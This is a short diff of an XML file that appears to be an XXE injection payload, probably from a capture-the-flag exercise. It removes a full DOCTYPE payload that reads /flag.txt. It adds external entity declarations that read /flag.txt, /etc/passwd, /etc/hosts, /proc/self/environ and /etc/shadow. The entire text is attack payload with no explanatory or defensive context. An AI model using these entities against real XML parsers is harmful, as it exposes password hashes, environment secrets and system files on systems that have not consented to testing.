@@ -1,8 +1,5 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///flag.txt" >
-]>
-<creds>
-    <user>&xxe;</user>
-</creds>
+<!ENTITY aaa SYSTEM "file:///flag.txt">
+<!ENTITY passwd SYSTEM "file:///etc/passwd">
+<!ENTITY hosts SYSTEM "file:///etc/hosts">
+<!ENTITY env SYSTEM "file:///proc/self/environ">
+<!ENTITY shadow SYSTEM "file:///etc/shadow">
